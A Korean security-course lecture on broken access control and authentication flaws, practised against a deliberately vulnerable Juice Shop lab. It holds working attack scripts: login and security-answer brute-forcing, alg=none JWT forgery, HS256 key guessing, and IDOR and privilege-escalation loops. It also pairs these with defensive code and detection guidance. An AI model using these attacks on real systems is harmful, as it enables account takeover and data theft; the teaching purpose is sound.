# Week 06: OWASP A01 + A07 — 접근 제어·인증 취약점

## 학습 목표
- 인증(Authentication)과 인가(Authorization)의 차이를 이해한다
- 기본·약한 비밀번호, 보안질문 재설정, 세션 관리 취약점을 식별한다
- JWT의 서명 메커니즘을 이해하고 alg=none·약한 HS256 키 공격을 시도한다
- IDOR, 수평·수직 권한 상승을 JuiceShop에서 실습한다
- 접근 제어의 서버 측 검증·RBAC·UUID 기반 방어를 설명한다
- MITRE ATT&CK T1078(Valid Accounts), T1110(Brute Force)와 매핑한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 실습 기지, Bastion API :8003 |
| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |

이번 주는 Week 03~05에서 학습한 HTTP/JWT/쿠키 지식 위에 **인증과 인가**를 쌓는다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:25 | 인증 vs 인가 개념 (Part 1) | 강의 |
| 0:25-1:00 | 인증 취약점 실습 (Part 2) | 실습 |
| 1:00-1:10 | 휴식 | - |
| 1:10-1:50 | JWT 공격 실습 (Part 3) | 실습 |
| 1:50-2:30 | IDOR·권한 상승 (Part 4) | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 방어 + 탐지 (Part 5~6) | 강의+실습 |
| 3:10-3:30 | Bastion 자동화 (Part 7) | 실습 |
| 3:30-3:40 | 정리 + 과제 | 정리 |

---

# Part 1: 인증 vs 인가

보안에서 가장 중요한 두 가지 개념. 반드시 구분해야 한다.

## 1.1 인증 (Authentication) — "너는 누구인가?"

사용자의 **신원을 확인**하는 과정:
- ID/PW 로그인
- 지문/얼굴 인식
- OTP (일회용 비밀번호)
- 인증서 기반 (mTLS, 공인인증서)

## 1.2 인가 (Authorization) — "너는 무엇을 할 수 있는가?"

인증된 사용자가 **어떤 자원에 접근할 권한**이 있는지 확인:
- 일반 사용자: 자신의 주문만 조회
- 관리자: 모든 사용자의 주문 조회

**비유:**
- 인증 = 건물 입구 출입증 확인 (이 사람이 직원인가?)
- 인가 = 각 방의 출입 권한 확인 (이 직원이 서버실에 들어갈 수 있는가?)

## 1.3 OWASP에서의 위치

| 카테고리 | 2017 순위 | 2021 순위 | 이번 주 |
|---------|-----------|-----------|---------|
| A01 Broken Access Control | A5 | **A1** (↑4) | ✓ |
| A07 Identification & Auth Failures | A2 | **A7** (↓5) | ✓ |

**2021년 A01이 1위로 올라온 이유:** 94%의 웹 애플리케이션에서 접근 제어 실패가 발견됨. SQLi와 달리 **비즈니스 로직**에 의존하므로 WAF로 방어 불가능.

## 1.4 MITRE ATT&CK 매핑

| 실습 내용 | ATT&CK 기법 | 전술 |
|----------|-------------|------|
| 기본 비밀번호 시도 | T1078 Valid Accounts | Initial Access |
| 비밀번호 브루트포스 | T1110 Brute Force | Credential Access |
| JWT 위조 | T1550.001 Application Access Token | Defense Evasion |
| IDOR | T1552 Unsecured Credentials | Credential Access |

---

# Part 2: 인증 취약점

## 2.1 기본·약한 비밀번호

**이것은 무엇인가?** 초기 설치 시 설정된 기본 계정(admin/admin)이나 추측 가능한 약한 비밀번호. 공격자가 SQLi 같은 복잡한 기법 전에 먼저 시도한다.

**실제 사례:**
- **2016 Mirai 봇넷**: IoT 기기 기본 비밀번호로 60만 대 감염 → Dyn DNS DDoS
- **2024 각종 유출 사건**의 3할은 brute force·credential stuffing

**실습:**

```bash
# 흔한 비밀번호 리스트로 admin 로그인 시도
for password in "admin" "admin123" "password" "123456" "admin@juice-sh.op"; do
  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$password\"}" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'authentication' in d else 'FAIL')" 2>/dev/null)
  echo "  $password -> $RESULT"
done
```

**명령 분해:**
- `for password in ...`: 5개 비밀번호 후보 순회
- 각 비밀번호로 로그인 POST
- `'authentication' in d`: 응답 JSON에 `authentication` 필드 있으면 성공

**예상 출력:**
```
  admin -> FAIL
  admin123 -> SUCCESS
  password -> FAIL
  123456 -> FAIL
  admin@juice-sh.op -> FAIL
```

**결과 해석:**
- `admin123` 성공 → JuiceShop admin 계정 비밀번호가 매우 약함
- 이 해시는 Week 04에서 JWT 페이로드로 이미 추출됨 (`0192023a7bbd73250516f069df18b500` = md5("admin123"))
- 실무에서는 **brute force 보호** (rate limiting, account lockout, CAPTCHA) 필요

## 2.2 비밀번호 정책 부재

**이것은 무엇인가?** 서버가 "최소 8자, 대소문자+숫자+특수문자" 같은 복잡도 규칙을 강제하지 않는 경우.

```bash
# 비밀번호 "1"로 계정 생성 시도
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak'$$'@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"a"}' \
  | python3 -m json.tool | head -15
```

**결과 해석:** 서버가 이 요청을 수락하면 비밀번호 정책이 없는 것. JuiceShop은 의도적으로 허용한다.

## 2.3 보안 질문 재설정 악용

**이것은 무엇인가?** "Your eldest sibling's middle name?" 같은 보안 질문은 OSINT(공개 정보 검색)로 추측 가능한 경우가 많다. Sarah Palin 이메일 해킹 사건(2008)이 대표 사례.

**Step 1: admin의 보안 질문 확인**

```bash
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op" \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "question": {
        "id": 2,
        "question": "Your eldest siblings middle name?"
    }
}
```

**Step 2: 답변 브루트포스**

```bash
for answer in "admin" "test" "John" "Samuel" "Jane" "Wolf" "Bender"; do
  RESP=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"Hacked123!\",\"repeat\":\"Hacked123!\"}")
  echo "  $answer : $(echo "$RESP" | head -c 80)"
done
```

**결과 해석:** 답이 맞으면 비밀번호가 재설정된다. JuiceShop은 의도적으로 답변 시도 횟수에 제한이 없다 → brute force 가능.

**방어:** 재설정 시도 rate limiting + 답변 실패 시 동일한 generic 메시지 + 2FA 병행.

---

# Part 3: JWT 공격

## 3.1 JWT 구조 복습

```
[헤더].[페이로드].[서명]
```

각 부분은 **Base64URL** 인코딩. 서명만 암호적 보호를 제공하고, 헤더·페이로드는 누구나 디코딩 가능.

```bash
# 일반 사용자로 로그인하여 토큰 확보
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 헤더 디코딩
echo "== Header =="
echo "$TOKEN" | cut -d. -f1 | python3 -c "
import sys, base64, json
d = sys.stdin.read().strip()
d += '=' * (4 - len(d) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(d)), indent=2))
"
```

**예상 출력:**
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**결과 해석:** JuiceShop은 **RS256**(비대칭 서명)을 사용한다. 공개키로는 검증만 가능, 위조는 개인키 필요.

## 3.2 alg=none 공격

**이것은 무엇인가?** JWT 표준(RFC 7519)에 정의된 `"alg": "none"` 옵션은 **서명 검증을 스킵**하게 한다. 서버가 이를 차단하지 않으면 공격자가 서명 없이 아무 페이로드나 서버에 제출 가능.

**원리:**
```
정상: eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoiY3VzdG9tZXIifQ.REAL_SIGNATURE
공격: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
     (서명 빈 문자열, alg=none, role=admin)
```

**위조 토큰 생성:**

```bash
python3 << 'PYEOF'
import base64, json

# 헤더: alg를 none으로
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

# 페이로드: admin role 위조
payload = {
    "status": "success",
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin",
        "isActive": True
    },
    "iat": 1711526400,
    "exp": 9999999999
}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# 서명 빈 문자열
forged = f"{header_b64}.{payload_b64}."
print(forged)
PYEOF
```

**위조 토큰으로 API 접근:**

```bash
FORGED_TOKEN="위_명령의_출력값"
curl -s -o /dev/null -w "Users API: HTTP %{http_code}\n" \
  http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

**결과 해석:**
- 200 반환 시: alg=none 취약 → **CRITICAL**
- 401 반환 시: 서버가 none 알고리즘을 차단 (정상)
- 최신 JuiceShop은 차단할 수 있으나 많은 실제 시스템이 여전히 취약

## 3.3 HS256 약한 키 브루트포스

**이것은 무엇인가?** JWT가 대칭키 HMAC(HS256)을 사용하면, 키가 짧거나 사전 단어이면 브루트포스로 깰 수 있다.

**JuiceShop은 RS256이므로 해당 없음**. 다른 시스템 기본값(`secret`, `jwt_secret` 등) 예시를 본다.

```bash
python3 << 'PYEOF'
import hmac, hashlib, base64

# 예시 HS256 JWT (테스트용)
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
payload = base64.urlsafe_b64encode(b'{"user":"test"}').decode().rstrip('=')
message = f"{header}.{payload}"

# 'secret' 키로 서명 생성 (서버가 이 키를 쓴다고 가정)
real_sig = hmac.new(b'secret', message.encode(), hashlib.sha256).digest()
real_sig_b64 = base64.urlsafe_b64encode(real_sig).decode().rstrip('=')
token = f"{message}.{real_sig_b64}"
print(f"Test token: {token[:50]}...")

# 브루트포스
candidates = ['secret', 'password', '123456', 'jwt_secret', 'key', 'changeme']
for secret in candidates:
    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    if sig == real_sig:
        print(f"[FOUND] Secret: '{secret}'")
        break
else:
    print("[NOT FOUND]")
PYEOF
```

**결과 해석:** 실제 서버의 키가 사전 단어면 `hashcat -m 16500 token.txt wordlist.txt`로 크래킹 가능. **방어는 128비트 이상 랜덤 키**.

---

# Part 4: 접근 제어 취약점

## 4.1 IDOR (Insecure Direct Object Reference)

**이것은 무엇인가?** URL·파라미터의 ID를 변경하여 **다른 사용자의 데이터**에 접근하는 공격. 서버가 "이 사용자가 이 데이터에 접근할 권한이 있는가?"를 검증하지 않을 때 발생.

**전형적 패턴:**
```
내 주문:       GET /api/Users/22/orders
다른 사람 주문: GET /api/Users/1/orders   ← ID만 변경
```

## 4.2 실습: JuiceShop IDOR

**Step 1: 내 사용자 ID 확인**

```bash
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
d = sys.stdin.read().strip() + '=='
info = json.loads(base64.urlsafe_b64decode(d))
print(f'My user id: {info[\"data\"][\"id\"]}, email: {info[\"data\"][\"email\"]}')
"
```

**예상 출력:**
```
My user id: 22, email: student@test.com
```

**Step 2: 다른 사용자 장바구니에 접근 시도**

```bash
# 장바구니 ID 1~5에 순차 접근
for basket_id in 1 2 3 4 5 22; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.30.80:3000/rest/basket/$basket_id \
    -H "Authorization: Bearer $TOKEN")
  echo "  basket/$basket_id -> HTTP $CODE"
done
```

**예상 출력:**
```
  basket/1 -> HTTP 200
  basket/2 -> HTTP 200
  basket/3 -> HTTP 200
  basket/4 -> HTTP 200
  basket/5 -> HTTP 200
  basket/22 -> HTTP 200
```

**결과 해석:**
- 내 장바구니(22)만 접근 가능해야 하는데 1~5도 전부 200 → **IDOR 성공**
- 이는 JuiceShop의 의도적 취약점. 서버가 `basket_id`와 현재 토큰의 user_id를 비교하지 않음

**Step 3: 다른 사용자 장바구니 내용 조회**

```bash
echo "=== Admin(id=1) 장바구니 ==="
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool | head -20
```

## 4.3 수평적 권한 상승

**같은 권한 수준의 다른 사용자** 데이터 접근.

```bash
# Users 테이블 순차 ID로 정보 조회
for uid in 1 2 3 4 5; do
  RESP=$(curl -s http://10.20.30.80:3000/api/Users/$uid \
    -H "Authorization: Bearer $TOKEN")
  email=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('email','?'))" 2>/dev/null)
  echo "  User $uid : $email"
done
```

**결과 해석:** customer 토큰으로 전체 사용자 이메일이 조회된다 → **BOLA(Broken Object Level Authorization)** — OWASP API Top 10 #1.

## 4.4 수직적 권한 상승

**상위 권한(admin)** 기능 접근.

```bash
echo "== 관리자 기능 접근 시도 (customer 토큰으로) =="

# 전체 사용자 DB
curl -s -o /dev/null -w "  /api/Users/           -> HTTP %{http_code}\n" \
  http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $TOKEN"

# 피드백 삭제 (DELETE)
curl -s -o /dev/null -w "  DELETE /api/Feedbacks/1 -> HTTP %{http_code}\n" \
  -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
  -H "Authorization: Bearer $TOKEN"

# 관리 설정
curl -s -o /dev/null -w "  /rest/admin/application-configuration -> HTTP %{http_code}\n" \
  http://10.20.30.80:3000/rest/admin/application-configuration \
  -H "Authorization: Bearer $TOKEN"
```

**결과 해석 — 각 200은 수직 권한상승 성공:**
- `/api/Users/` 200 → 전체 사용자 목록 유출
- `DELETE /api/Feedbacks/1` 200 → 일반 사용자가 다른 사람 피드백 삭제
- `/rest/admin/application-configuration` 200 → 관리 설정 유출

JuiceShop은 대부분 의도적으로 노출. 실무라면 즉시 CRITICAL.

## 4.5 다른 사용자 장바구니에 상품 추가

```bash
# BasketId=1 (admin 장바구니)에 상품 추가 시도
curl -s -X POST http://10.20.30.80:3000/api/BasketItems/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"ProductId":1,"BasketId":1,"quantity":1}' \
  | python3 -m json.tool
```

**결과 해석:** 성공하면 customer가 admin의 장바구니를 조작한 것. JuiceShop에서 이것이 CTF 챌린지 중 하나.

---

# Part 5: 접근 제어 방어

## 5.1 서버 측 권한 검증 (가장 중요)

**취약한 코드:**
```javascript
// URL의 ID만으로 데이터 반환
app.get('/api/Users/:id', (req, res) => {
  return User.findByPk(req.params.id);
});
```

**안전한 코드:**
```javascript
app.get('/api/Users/:id', authenticate, (req, res) => {
  // 현재 토큰의 user_id와 URL ID 비교
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  return User.findByPk(req.params.id);
});
```

**원칙:**
- 절대 프론트엔드에 권한 검증을 맡기지 말 것
- 매 API 호출마다 **토큰의 user_id/role**과 **요청 대상**을 비교
- 비교 실패 시 403 (404가 아닌 이유: 존재 정보 노출 방지용 논쟁 있음)

## 5.2 RBAC (Role-Based Access Control)

역할별 허용 API 표를 중앙에서 관리:

```
Admin  → 모든 API
User   → 자기 데이터 조작, 공개 API 조회
Guest  → 공개 API만
```

구현 패턴:
```javascript
const policy = {
  '/api/Users/:id': {
    GET:  { allow: ['admin', 'self'] },
    PUT:  { allow: ['admin', 'self'] },
    DELETE: { allow: ['admin'] }
  }
};
```

## 5.3 UUID 사용

순차 ID(1, 2, 3...) 대신 UUID:

```
# 추측 가능 (IDOR 쉬움)
GET /api/Users/1

# 추측 불가 (보조 방어)
GET /api/Users/550e8400-e29b-41d4-a716-446655440000
```

**주의:** UUID는 **보조** 방어. 메인은 서버 측 권한 검증. UUID만 믿으면 log, referer 등으로 유출될 때 여전히 취약.

## 5.4 비밀번호 정책 + brute force 방어

```
- 최소 10자 (또는 12자 이상 권장)
- 사전 단어 차단 (zxcvbn 라이브러리)
- 5회 실패 시 15분 계정 잠금
- 분당 10회 reCAPTCHA
- 2FA 강제 (민감 계정)
```

## 5.5 JWT 방어

```
- RS256 사용 (비대칭) 또는 HS256이면 128비트 이상 랜덤 키
- 서버 측 알고리즘 화이트리스트 (none 거부)
- iat, exp, nbf 검증
- 짧은 만료 (15분) + refresh token 패턴
- 페이로드에 민감 정보(패스워드 해시 등) 넣지 않기
```

---

# Part 6: SIEM·WAF 탐지

## 6.1 Wazuh에서 인증 공격 탐지

```bash
ssh ccc@10.20.30.100 \
  "sudo grep -iE 'auth|login|brute' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5"
```

**탐지 룰 예시:**
- 짧은 시간 내 다수 로그인 실패 → **brute force**
- 다른 계정으로 반복 로그인 시도 (credential stuffing)
- IP당 rate 초과

## 6.2 Suricata IPS 탐지

IDOR 자체는 정상 HTTP 요청이라 Suricata로 탐지하기 어렵다. **인증 공격**만 탐지 가능.

```bash
ssh ccc@10.20.30.1 "sudo grep -iE 'brute|auth' /var/log/suricata/fast.log" 2>/dev/null | tail -3
```

## 6.3 접근 제어 취약점 탐지의 한계

- **IDOR**: 정상 HTTP 요청과 구분 불가. 방어는 코드 레벨에서만
- **BOLA**: 마찬가지
- **수직 권한상승**: 로그에 접근 기록은 남지만, 어떤 요청이 "권한 있는 요청"인지 IPS는 알 수 없음

→ 탐지보다 **예방**(서버 측 권한 검증)이 유일한 방법

---

# Part 7: Bastion 자연어 접근 제어 점검

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop(http://10.20.30.80:3000)에서 customer 권한 토큰으로 /api/Users/1~5를 순차 조회하고, 각 응답 상태 코드를 정리한 뒤 IDOR 취약점 존재 여부를 판단해줘. 토큰은 email=student@test.com, password=Student123!로 로그인해서 발급받으면 돼."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

Evidence 확인:

```bash
curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
import sys, json
for e in json.load(sys.stdin)[:5]:
    msg = e.get('user_message','')[:70]
    ok = '✓' if e.get('success') else '✗'
    print(f'  {ok} {msg}')
"
```

---

## 과제 (다음 주까지)

### 과제 1: 인증 취약점 (30점)

1. admin의 보안 질문을 확인하고 답변 브루트포스 시도 (결과 기록) — 10점
2. JWT 헤더에서 `alg` 확인, `alg=none` 위조 토큰 생성 후 `/api/Users/` 접근 결과 — 10점
3. Week 04에서 획득한 admin MD5 해시(`0192023a7bbd73250516f069df18b500`)를 crackstation.net에서 역산한 결과 — 10점

### 과제 2: 접근 제어 취약점 (40점)

1. customer 토큰으로 `/rest/basket/1~5` 조회 결과표 작성 — 10점
2. customer 토큰으로 수직 권한 상승(전체 사용자, 피드백 삭제) 시도 결과 — 10점
3. customer 토큰으로 admin의 장바구니에 상품 추가 시도 결과 — 10점
4. 발견한 모든 접근 제어 취약점의 CVSS v3.1 스코어 산정 — 10점

### 과제 3: 방어 코드 (30점)

1. IDOR 방어 `/api/Users/:id` 엔드포인트의 Node.js(Express) 코드 — 10점
2. RBAC 정책 객체 설계 (3개 역할 × 최소 5개 API) — 10점
3. Bastion `/ask`로 IDOR 자동 점검 결과 + `/evidence` 기록 — 10점

---

## 다음 주 예고

**Week 07: SSRF + 파일 업로드 + 경로 순회**
- SSRF로 내부 메타데이터 API 접근
- JuiceShop 파일 업로드 우회 (`%2500` null byte)
- 경로 순회 (`../../../etc/passwd`)
- XXE (XML External Entity)

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **인증** | Authentication | "너 누구?" — 신원 확인 |
| **인가** | Authorization | "너 뭐 할 수 있어?" — 권한 확인 |
| **IDOR** | Insecure Direct Object Reference | ID를 바꿔 다른 사용자 데이터 접근 |
| **BOLA** | Broken Object Level Authorization | IDOR의 API 버전 (OWASP API #1) |
| **수평 권한상승** | Horizontal Privilege Escalation | 같은 레벨의 다른 사용자 데이터 접근 |
| **수직 권한상승** | Vertical Privilege Escalation | 상위 권한(admin) 기능 접근 |
| **alg=none** | - | JWT 서명 검증 스킵하는 알고리즘 |
| **RS256** | RSA SHA-256 | 비대칭 JWT 서명 (JuiceShop 사용) |
| **HS256** | HMAC SHA-256 | 대칭 JWT 서명 |
| **RBAC** | Role-Based Access Control | 역할 기반 접근 제어 |
| **UUID** | Universally Unique Identifier | 128비트 랜덤 식별자 |
| **Credential Stuffing** | - | 유출된 다른 서비스 ID/PW를 여기에 시도 |
| **rate limiting** | - | 시간당 요청 수 제한 |

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 실제로 사용한 도구·엔드포인트.

### Python 내장 JWT 디코더 (이번 주 실제 사용)

이번 주 JWT 분석은 외부 도구 없이 Python 표준 라이브러리(`base64`, `json`, `hmac`)만으로 수행한다. 별도 설치 불필요.

**이번 주 사용 패턴:**

```bash
# 디코딩 (페이로드 기준)
echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
d = sys.stdin.read().strip()
d += '=' * (4 - len(d) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(d)), indent=2))
"

# 위조 토큰 생성 (alg=none)
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps({'role':'admin'}).encode()).decode().rstrip('=')
print(f'{h}.{p}.')
"

# HS256 서명 (키 브루트포스용)
python3 -c "
import hmac, hashlib, base64
msg = 'header.payload'
sig = hmac.new(b'secret', msg.encode(), hashlib.sha256).digest()
print(base64.urlsafe_b64encode(sig).decode().rstrip('='))
"
```

### JuiceShop 이번 주 대상 엔드포인트

| 엔드포인트 | 메서드 | 취약점 | 공략 |
|-----------|--------|--------|------|
| `/rest/user/login` | POST | 기본 비밀번호 | admin123 |
| `/rest/user/security-question?email=` | GET | 보안 질문 노출 | admin 보안 질문 조회 |
| `/rest/user/reset-password` | POST | 답변 brute force | OSINT로 추측 |
| `/api/Users/` | GET (Bearer) | 수직 권한상승 | customer로 조회 |
| `/api/Users/:id` | GET (Bearer) | 수평 권한상승 (IDOR) | id 순차 변경 |
| `/rest/basket/:id` | GET (Bearer) | IDOR | basket_id 순차 접근 |
| `/api/BasketItems/` | POST (Bearer) | BasketId 조작 | 타인 장바구니에 추가 |
| `/api/Feedbacks/:id` | DELETE (Bearer) | 수직 권한상승 | customer 토큰으로 삭제 |
| `/rest/admin/application-configuration` | GET | 관리 설정 유출 | 인증 없이 접근 가능 |

### Bastion API — 이번 주 사용 엔드포인트

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 접근제어 점검 지시 |
| GET | `/evidence?limit=N` | 작업 기록 |

> `/chat`, `/skills`, `/playbooks`, `/onboard`는 이번 주 미사용.

---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (6주차) 학습 주제와 직접 연관된 *실제* incident:

### 스피어 피싱 첨부파일 — HTA + PowerShell downloader

> **출처**: WitFoo Precinct 6 / `incident-2024-08-004` (anchor: `anc-cbdabf2e6c87`) · sanitized
> **시점**: 2024-08-18 (Initial Access)

**관찰**: user@victim.example 이 invoice.hta 첨부 실행 → mshta.exe → cmd → powershell -enc <base64 payload>.

**MITRE ATT&CK**: **T1566.001 (Spearphishing Attachment)**, **T1059.001 (PowerShell)**, **T1218.005 (Mshta)**

**IoC**:
  - `invoice.hta`
  - `mshta.exe → cmd → powershell -enc`

**학습 포인트**:
- HTA 가 IE/MSHTA 통해 신뢰 zone 으로 실행 — 클라이언트 측 첫 발판
- AppLocker 또는 Windows Defender ASR 룰로 mshta.exe child process 차단 가능
- 탐지: Sysmon EID 1 (process create), parent=mshta.exe child=cmd/powershell
- 방어: 이메일 게이트웨이 첨부 sandboxing, .hta 차단, ASR 룰, EDR 프로세스 트리


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
